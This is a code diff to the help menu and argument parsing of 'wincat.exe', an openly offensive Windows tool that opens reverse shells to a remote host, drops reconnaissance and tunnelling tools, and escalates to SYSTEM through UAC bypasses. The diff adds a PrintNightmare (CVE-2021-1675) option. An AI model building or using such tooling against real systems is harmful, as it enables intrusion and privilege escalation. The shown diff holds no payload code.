@@ -57,7 +57,7 @@ VOID PrintMenu(char* workingDirecotry) {
     printf("\nMultiple reverse shell (CMD/PS/CS/MSF_RECV_TCP/MSF_RECV_HTTP/MSF_RECV_HTTPS).\n\n");
 
     printf("wincat.exe RHOST RPORT [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-P cmd/ps/cs/cshell/rtcp/http/https] [winpeas/chisel/shound/all/safe/...]\n");
-    printf("wincat.exe RHOST RPORT getsystem [-uac 1/2/3/4]\n");
+    printf("wincat.exe RHOST RPORT getsystem [-uac 1/2/3/4/5]\n");
     printf("wincat.exe RHOST RPORT detached\n");
     printf("wincat.exe [wget/winpeas/chisel/shound/all/safe/...]\n\n");
 
@@ -108,9 +108,10 @@ VOID PrintMenu(char* workingDirecotry) {
     printf("\tgetsystem\tExploit that bypass UAC and upgrade to system (Need to be in the admin group).\n");
     printf("\t\t\tUAC bypass technique:\n");
     printf("\t\t\t\t-uac\t1: computerdefaults.\n");
-    printf("\t\t\t\t-uac\t2: WSReset. \t\t[DEFAULT]\n");
+    printf("\t\t\t\t-uac\t2: WSReset.\n");
     printf("\t\t\t\t-uac\t3: Silent Cleanup.\n");
-    printf("\t\t\t\t-uac\t4: DLL hijacking - Trusted Directories.\n");
+    printf("\t\t\t\t-uac\t4: DLL hijacking - Trusted Directories. \t[DEFAULT]\n");
+    printf("\t\t\t\t-uac\t5: PrintNightmare LPE - (CVE-2021-1675)\n");
     printf("\tdetached\tRun wincat with a new process.\n\n");
     //printf("Note:\n");
     //printf("\tThe path where the tools are drop is in '%s'.\n\n",workingDirecotry);
@@ -131,7 +132,7 @@ BOOL GetArguments(int argc, WCHAR* argv[], pArguments listAgrument) {
     listAgrument->payloadType = PAYLOAD_RECV_CMD;
     listAgrument->Detached = FALSE;
     listAgrument->GetSystem = FALSE;
-    listAgrument->UacBypassTec = UAC_BYPASS_COMP_WSREST;
+    listAgrument->UacBypassTec = UAC_BYPASS_COMP_TRUSTED_DIR;
     listAgrument->toDROP = Nothing;
 
     if (argc == 1) {
@@ -238,7 +239,7 @@ BOOL GetArguments(int argc, WCHAR* argv[], pArguments listAgrument) {
                 listAgrument->GetSystem = TRUE;
                 if (argc == count + 2 + 1 && MATCHW(argv[count + 1], L"-uac")) {
                     int tecNum = _wtoi(argv[count + 2]);
-                    if (tecNum > 0 && tecNum < 5) {
+                    if (tecNum > 0 && tecNum < 6) {
                         listAgrument->UacBypassTec = tecNum - 1;
                         count += 2;
                     }
